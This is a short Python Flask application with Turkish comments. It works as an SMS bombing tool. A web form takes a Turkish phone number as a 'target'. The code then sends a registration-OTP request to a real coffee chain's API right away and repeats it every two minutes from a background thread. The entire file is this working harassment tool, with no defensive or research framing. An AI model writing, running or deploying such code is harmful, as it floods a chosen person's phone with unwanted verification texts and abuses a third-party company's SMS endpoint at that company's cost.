import os
import time
import threading
import requests
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

# Sistem durumunu hafızada tutan değişkenler
state = {
    "phone": "",
    "active": False
}

def render_log(msg):
    """Log çıktılarını temiz bir şekilde Render paneline (Tail Logs) basar"""
    print(f"[SYSTEM LOG] {time.strftime('%H:%M:%S')} - {msg}", flush=True)

def send_otp():
    """Orijinal hedef uç noktaya istek atan ana fonksiyon"""
    if not state["active"] or not state["phone"]:
        return
    
    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
    payload = {"mobile_number": state["phone"], "country_code": "90"}
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        render_log(f"İstek Sonucu (Status Code): {res.status_code}")
    except Exception as e:
        render_log(f"Bağlantı hatası gerçekleşti, istek iletilemedi: {e}")

def worker():
    """24 saat boyunca her 2 dakikada bir arka planda çalışacak motor döngüsü"""
    while True:
        if state["active"] and state["phone"]:
            # İlk istek arayüz tetiklemesiyle anında atıldığı için döngü 120 saniye bekleyerek başlar
            time.sleep(120)
            if state["active"] and state["phone"]:
                render_log("2 dakikalık periyot doldu, yeni döngü tetikleniyor...")
                send_otp()
        else:
            time.sleep(1)

# Arka plan thread kontrolü (Aynı işçinin mükerrer başlamasını engeller)
if not any(t.name == "OTPWorker" for t in threading.enumerate()):
    threading.Thread(target=worker, name="OTPWorker", daemon=True).start()

# --- ULTRA SADE VE ŞIK TASARIM (UI) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş</title>
    <style>
        body { font-family: sans-serif; background: #0a0a0c; color: #e4e4e7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #121214; border: 1px solid #1c1c1f; padding: 30px; border-radius: 16px; width: 100%; max-width: 340px; text-align: center; }
        input { width: 100%; padding: 14px; background: #18181b; border: 1px solid #27272a; border-radius: 10px; color: #fff; font-size: 16px; text-align: center; outline: none; box-sizing: border-box; margin-bottom: 12px; }
        button { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .status { font-size: 13px; color: #10b981; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <form method="POST" action="/">
            <input type="text" name="phone" placeholder="5XXXXXXXXX" maxlength="10" value="{{ phone }}" required>
            <button type="submit">Başlat</button>
        </form>
        {% if active and phone %}
        <div class="status">+90 {{ phone }} başlatıldı...</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        p = request.form.get('phone', '').strip()
        if len(p) == 10 and p.isdigit():
            state["phone"] = p
            state["active"] = True
            render_log(f"Sistem Tetiklendi -> Hedef Numara: +90{p}")
            
            # SIFIRINCI SANİYEDE ANINDA İLK SMS TETİKLEMESİ
            send_otp()
        return redirect(url_for('index'))

    return render_template_string(HTML_TEMPLATE, phone=state["phone"], active=state["active"])

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
